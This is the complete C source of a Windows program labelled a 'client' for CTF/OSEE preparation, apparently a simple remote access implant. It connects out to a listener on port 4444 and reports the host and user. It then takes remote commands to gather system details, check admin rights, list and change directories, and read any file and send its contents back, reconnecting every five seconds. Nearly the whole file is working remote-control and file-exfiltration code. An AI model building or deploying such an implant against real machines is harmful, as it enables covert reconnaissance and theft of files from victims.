/*
 * Windows Client for CTF/OSEE Preparation - Version 4
 * Compile on Linux: x86_64-w64-mingw32-gcc -o client.exe client.c -lws2_32 -liphlpapi -static
 * Usage: client.exe <listener_ip> [port]
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <direct.h>
#include <iphlpapi.h>
#include <ws2tcpip.h>

#pragma comment(lib, "iphlpapi.lib")

#define BUFFER_SIZE 16384
#define DEFAULT_PORT 4444

// Function declarations
void read_file(char *filename, char *output, size_t output_size);
void get_os_info(char *output, size_t size);
void get_computer_info(char *output, size_t size);
void get_memory_info(char *output, size_t size);
void get_disk_info(char *output, size_t size);
void get_network_info(char *output, size_t size);
void get_system_info(char *output, size_t output_size);
void get_directory_listing(char *output, size_t output_size);
void handle_command(char *cmd, char *output, size_t output_size);

// Read file content
void read_file(char *filename, char *output, size_t output_size) {
    FILE *file;
    char line[1024];
    size_t total_read = 0;
    
    memset(output, 0, output_size);
    
    file = fopen(filename, "rb");
    if (file == NULL) {
        snprintf(output, output_size, "[-] Failed to open file: %s\n", filename);
        return;
    }
    
    snprintf(output, output_size, "\n=== File: %s ===\n\n", filename);
    total_read = strlen(output);
    
    // Read file content
    while (fgets(line, sizeof(line), file) != NULL && total_read < output_size - 1024) {
        size_t line_len = strlen(line);
        if (total_read + line_len < output_size - 1) {
            strcat(output, line);
            total_read += line_len;
        } else {
            strcat(output, "\n[...] File too large, truncated\n");
            break;
        }
    }
    
    fclose(file);
    
    if (total_read == strlen(output)) {
        strcat(output, "[!] File is empty\n");
    }
    
    strcat(output, "\n=== End of File ===\n\n");
}

// Get OS information
void get_os_info(char *output, size_t size) {
    OSVERSIONINFOEX osvi;
    SYSTEM_INFO si;
    char temp[512];
    
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    
    strcat(output, "=== OS Information ===\n");
    
    #pragma GCC diagnostic push
    #pragma GCC diagnostic ignored "-Wdeprecated-declarations"
    if (GetVersionEx((OSVERSIONINFO*)&osvi)) {
        snprintf(temp, sizeof(temp), "OS Version: %lu.%lu Build %lu\n",
                osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
        strcat(output, temp);
        
        if (osvi.szCSDVersion[0] != '\0') {
            snprintf(temp, sizeof(temp), "Service Pack: %s\n", osvi.szCSDVersion);
            strcat(output, temp);
        }
    }
    #pragma GCC diagnostic pop
    
    GetSystemInfo(&si);
    snprintf(temp, sizeof(temp), "Processor Architecture: ");
    strcat(output, temp);
    
    switch(si.wProcessorArchitecture) {
        case PROCESSOR_ARCHITECTURE_AMD64:
            strcat(output, "x64 (AMD64)\n");
            break;
        case PROCESSOR_ARCHITECTURE_INTEL:
            strcat(output, "x86\n");
            break;
        case PROCESSOR_ARCHITECTURE_ARM:
            strcat(output, "ARM\n");
            break;
        default:
            strcat(output, "Unknown\n");
    }
    
    snprintf(temp, sizeof(temp), "Number of Processors: %lu\n\n", si.dwNumberOfProcessors);
    strcat(output, temp);
}

// Get computer information
void get_computer_info(char *output, size_t size) {
    char hostname[256];
    char username[256];
    DWORD dsize;
    char temp[512];
    
    strcat(output, "=== Computer Information ===\n");
    
    dsize = sizeof(hostname);
    if (GetComputerNameA(hostname, &dsize)) {
        snprintf(temp, sizeof(temp), "Computer Name: %s\n", hostname);
        strcat(output, temp);
    }
    
    dsize = sizeof(username);
    if (GetUserNameA(username, &dsize)) {
        snprintf(temp, sizeof(temp), "Username: %s\n", username);
        strcat(output, temp);
    }
    
    // Check if user is admin
    BOOL isAdmin = FALSE;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdministratorsGroup;
    
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                 DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0,
                                 &AdministratorsGroup)) {
        CheckTokenMembership(NULL, AdministratorsGroup, &isAdmin);
        FreeSid(AdministratorsGroup);
    }
    
    snprintf(temp, sizeof(temp), "Admin Privileges: %s\n\n", isAdmin ? "YES" : "NO");
    strcat(output, temp);
}

// Get memory information
void get_memory_info(char *output, size_t size) {
    MEMORYSTATUSEX memInfo;
    char temp[512];
    
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    
    strcat(output, "=== Memory Information ===\n");
    
    if (GlobalMemoryStatusEx(&memInfo)) {
        DWORDLONG totalPhysMB = memInfo.ullTotalPhys / (1024 * 1024);
        DWORDLONG availPhysMB = memInfo.ullAvailPhys / (1024 * 1024);
        
        snprintf(temp, sizeof(temp), "Total Physical Memory: %llu MB\n", totalPhysMB);
        strcat(output, temp);
        
        snprintf(temp, sizeof(temp), "Available Physical Memory: %llu MB\n", availPhysMB);
        strcat(output, temp);
        
        snprintf(temp, sizeof(temp), "Memory Load: %lu%%\n\n", memInfo.dwMemoryLoad);
        strcat(output, temp);
    }
}

// Get disk information
void get_disk_info(char *output, size_t size) {
    char temp[512];
    DWORD drives = GetLogicalDrives();
    
    strcat(output, "=== Disk Information ===\n");
    
    for (int i = 0; i < 26; i++) {
        if (drives & (1 << i)) {
            char drive[4] = {0};
            sprintf(drive, "%c:\\", 'A' + i);
            
            ULARGE_INTEGER freeBytesAvailable, totalBytes, totalFreeBytes;
            
            if (GetDiskFreeSpaceExA(drive, &freeBytesAvailable, &totalBytes, &totalFreeBytes)) {
                DWORDLONG totalGB = totalBytes.QuadPart / (1024 * 1024 * 1024);
                DWORDLONG freeGB = totalFreeBytes.QuadPart / (1024 * 1024 * 1024);
                
                snprintf(temp, sizeof(temp), "Drive %s - Total: %llu GB, Free: %llu GB\n",
                        drive, totalGB, freeGB);
                strcat(output, temp);
            }
        }
    }
    strcat(output, "\n");
}

// Get network information
void get_network_info(char *output, size_t size) {
    char temp[512];
    PIP_ADAPTER_INFO pAdapterInfo;
    ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
    
    strcat(output, "=== Network Information ===\n");
    
    pAdapterInfo = (IP_ADAPTER_INFO *)malloc(ulOutBufLen);
    
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
        free(pAdapterInfo);
        pAdapterInfo = (IP_ADAPTER_INFO *)malloc(ulOutBufLen);
    }
    
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
        PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
        
        while (pAdapter) {
            snprintf(temp, sizeof(temp), "\nAdapter: %s\n", pAdapter->Description);
            strcat(output, temp);
            
            snprintf(temp, sizeof(temp), "  MAC Address: ");
            strcat(output, temp);
            for (UINT i = 0; i < pAdapter->AddressLength; i++) {
                snprintf(temp, sizeof(temp), "%02X%s", 
                        pAdapter->Address[i],
                        (i == pAdapter->AddressLength - 1) ? "\n" : "-");
                strcat(output, temp);
            }
            
            snprintf(temp, sizeof(temp), "  IP Address: %s\n", 
                    pAdapter->IpAddressList.IpAddress.String);
            strcat(output, temp);
            
            snprintf(temp, sizeof(temp), "  Gateway: %s\n", 
                    pAdapter->GatewayList.IpAddress.String);
            strcat(output, temp);
            
            pAdapter = pAdapter->Next;
        }
    }
    
    if (pAdapterInfo) {
        free(pAdapterInfo);
    }
    
    strcat(output, "\n");
}

// Get complete system information
void get_system_info(char *output, size_t output_size) {
    memset(output, 0, output_size);
    
    strcat(output, "\n");
    strcat(output, "╔════════════════════════════════════════╗\n");
    strcat(output, "║     WINDOWS SYSTEM INFORMATION         ║\n");
    strcat(output, "╚════════════════════════════════════════╝\n");
    strcat(output, "\n");
    
    get_os_info(output, output_size);
    get_computer_info(output, output_size);
    get_memory_info(output, output_size);
    get_disk_info(output, output_size);
    get_network_info(output, output_size);
}

// Get directory listing
void get_directory_listing(char *output, size_t output_size) {
    WIN32_FIND_DATA findData;
    HANDLE hFind;
    char cwd[MAX_PATH];
    char search_path[MAX_PATH];
    char temp[512];
    
    memset(output, 0, output_size);
    
    if (_getcwd(cwd, sizeof(cwd)) == NULL) {
        snprintf(output, output_size, "[-] Failed to get current directory\n");
        return;
    }
    
    snprintf(output, output_size, "\nDirectory: %s\n\n", cwd);
    
    snprintf(search_path, sizeof(search_path), "%s\\*", cwd);
    hFind = FindFirstFile(search_path, &findData);
    
    if (hFind == INVALID_HANDLE_VALUE) {
        strcat(output, "[-] Failed to list directory\n");
        return;
    }
    
    do {
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            snprintf(temp, sizeof(temp), "[DIR]  %s\n", findData.cFileName);
        } else {
            ULONGLONG fileSize = ((ULONGLONG)findData.nFileSizeHigh << 32) | findData.nFileSizeLow;
            snprintf(temp, sizeof(temp), "[FILE] %-30s  %llu bytes\n", findData.cFileName, fileSize);
        }
        
        if (strlen(output) + strlen(temp) < output_size - 1) {
            strcat(output, temp);
        }
    } while (FindNextFile(hFind, &findData));
    
    FindClose(hFind);
    strcat(output, "\n");
}

// Handle commands
void handle_command(char *cmd, char *output, size_t output_size) {
    char *trimmed_cmd = cmd;
    
    while (*trimmed_cmd == ' ' || *trimmed_cmd == '\t') {
        trimmed_cmd++;
    }
    
    if (strcmp(trimmed_cmd, "sysinfo") == 0) {
        get_system_info(output, output_size);
    }
    else if (strncmp(trimmed_cmd, "dir", 3) == 0) {
        get_directory_listing(output, output_size);
    }
    else if (strncmp(trimmed_cmd, "cat ", 4) == 0) {
        char *filename = trimmed_cmd + 4;
        while (*filename == ' ' || *filename == '\t') {
            filename++;
        }
        read_file(filename, output, output_size);
    }
    else if (strncmp(trimmed_cmd, "type ", 5) == 0) {
        char *filename = trimmed_cmd + 5;
        while (*filename == ' ' || *filename == '\t') {
            filename++;
        }
        read_file(filename, output, output_size);
    }
    else if (strncmp(trimmed_cmd, "cd ", 3) == 0) {
        char *path = trimmed_cmd + 3;
        
        while (*path == ' ' || *path == '\t') {
            path++;
        }
        
        if (_chdir(path) == 0) {
            char cwd[MAX_PATH];
            _getcwd(cwd, sizeof(cwd));
            snprintf(output, output_size, "[+] Changed directory to: %s\n", cwd);
        } else {
            snprintf(output, output_size, "[-] Failed to change directory to: %s\n", path);
        }
    }
    else if (strcmp(trimmed_cmd, "pwd") == 0) {
        char cwd[MAX_PATH];
        if (_getcwd(cwd, sizeof(cwd)) != NULL) {
            snprintf(output, output_size, "%s\n", cwd);
        } else {
            snprintf(output, output_size, "[-] Failed to get current directory\n");
        }
    }
    else {
        snprintf(output, output_size, "[-] Unknown command: %s\n", trimmed_cmd);
    }
}

// Connect to listener
int connect_to_listener(const char *host, int port) {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    char buffer[BUFFER_SIZE];
    char output[BUFFER_SIZE];
    char hostname[256];
    char username[256];
    char cwd[MAX_PATH];
    DWORD size;
    int bytes_received;
    
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("[-] WSAStartup failed: %d\n", WSAGetLastError());
        return 1;
    }
    
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        printf("[-] Socket creation failed: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }
    
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(host);
    
    printf("[*] Connecting to %s:%d...\n", host, port);
    
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        printf("[-] Connection failed: %d\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return 1;
    }
    
    printf("[+] Connected to listener\n");
    
    memset(buffer, 0, BUFFER_SIZE);
    bytes_received = recv(sock, buffer, BUFFER_SIZE - 1, 0);
    if (bytes_received > 0) {
        buffer[bytes_received] = '\0';
        printf("%s", buffer);
    }
    
    size = sizeof(hostname);
    GetComputerNameA(hostname, &size);
    size = sizeof(username);
    GetUserNameA(username, &size);
    _getcwd(cwd, sizeof(cwd));
    
    snprintf(buffer, BUFFER_SIZE, "[+] %s\\%s @ %s", hostname, username, cwd);
    send(sock, buffer, strlen(buffer), 0);
    
    while (1) {
        memset(buffer, 0, BUFFER_SIZE);
        bytes_received = recv(sock, buffer, BUFFER_SIZE - 1, 0);
        
        if (bytes_received <= 0) {
            printf("[-] Connection lost\n");
            break;
        }
        
        buffer[bytes_received] = '\0';
        buffer[strcspn(buffer, "\r\n")] = 0;
        
        if (strcmp(buffer, "exit") == 0 || strcmp(buffer, "quit") == 0) {
            printf("[*] Exit command received\n");
            break;
        }
        
        handle_command(buffer, output, sizeof(output));
        
        // Send output with end marker
        send(sock, output, strlen(output), 0);
        send(sock, "<<<END>>>", 9, 0);
    }
    
    closesocket(sock);
    WSACleanup();
    return 0;
}

// Main function
int main(int argc, char *argv[]) {
    char *host;
    int port = DEFAULT_PORT;
    
    if (argc < 2) {
        printf("Usage: %s <listener_ip> [port]\n", argv[0]);
        printf("Example: %s 192.168.1.100 4444\n", argv[0]);
        return 1;
    }
    
    host = argv[1];
    if (argc > 2) {
        port = atoi(argv[2]);
    }
    
    printf("========================================\n");
    printf("Windows Client - Version 4\n");
    printf("File Browser + System Info + File Read\n");
    printf("========================================\n");
    
    while (1) {
        if (connect_to_listener(host, port) == 0) {
            break;
        }
        
        printf("[*] Retrying in 5 seconds...\n");
        Sleep(5000);
    }
    
    return 0;
}
